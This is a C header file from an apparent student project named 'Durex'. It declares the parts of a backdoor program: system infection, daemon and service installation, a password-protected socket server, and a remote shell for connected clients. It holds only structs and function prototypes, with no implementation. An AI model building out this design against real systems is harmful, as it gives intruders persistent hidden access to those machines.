/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   all.h                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/10/16 21:09:54 by frmarinh          #+#    #+#             */
/*   Updated: 2017/10/16 21:10:11 by frmarinh         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef ALL_H
# define ALL_H

/*
**	EXTERNAL INCLUDES
*/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <dirent.h>
#include <netinet/in.h>
#include <pthread.h>
#include <signal.h>

/*
**	INTERNAL INCLUDES
*/
#include "libft.h"

# define FRAISE				1
# define bool				int
# define true				1
# define false				0
# define BYTE				char
# define SOCKET				int
# define CLIENT_READ		4095
# define CLIENT_BUFFER		4096
# define PASSWORD_LEN		512
# define SERVICE_RAW_LEN	1024
# define LIBRARY_RAW_LEN	35000
# define BUFFER_LEN			1024
# define ENTRY_BUFFER		102400
# define PWD_CLIENT			4096

/*
**	Environments variables struct
*/
typedef struct		s_env
{
	char			*key;
	char			*value;
	struct s_env	*next;
}					t_env;

/*
**	Struct for server listener
*/
typedef struct		s_server
{
	SOCKET					sock;
	int						listen_port;
	struct sockaddr_in		in;
}					t_server;

/*
**	Program struct with all datas
*/
typedef struct		s_durex
{
	BYTE			*content;
	int				length;
	t_env			*env;
	char			*current_path;
	t_server		*server;
	int				clients;
	BYTE			*password;
}					t_durex;

/*
**	Struct for connected client
*/
typedef struct		s_client
{
	char			pwd[PWD_CLIENT];
	t_durex			*durex;
	SOCKET			socket;
}					t_client;

/*
**	ENV
*/
t_env					*get_env(char **);
t_env					*find_env_key(t_durex*, char*);

/*
** DUREX
*/
t_durex					*get_durex(char**, int);
bool					is_in_binary_path(t_durex*);
void					get_durex_content(t_durex*);

/*
**	UTILS
*/
int						get_random(int, int);
int						get_file_length(char*);
char					*get_current_path();
bool					clear_buffer(char*);
bool					path_exist(char*);

/*
**	INFECTION
*/
void					infect_system(t_durex*);

/*
**	DAEMON
*/
void					init_daemon(t_durex*);

/*
**	SERVER
*/
void					init_server(int, t_durex*);

/*
**	CLIENT
*/
void					accept_client(int, t_durex*);

/*
**	AUTHENTICATION
*/
bool					authenticate_client(t_client*);

/*
**	PASSWORD
*/
void					generate_authentication_password(t_durex*);

/*
**	SERVICE
*/
void					init_daemon_service(t_durex*);

/*
**	DUREX
*/
void					init_library(t_durex*);

/*
**	ENTRY
*/
void					entry_handler(t_client*, char*, bool);
void					print_prompt(t_client*, bool);

/*
**	SHELL
*/
void					remote_shell(t_client*);

/*
**	CHDIR
*/
bool					handle_chdir(t_client*, char*);

#endif
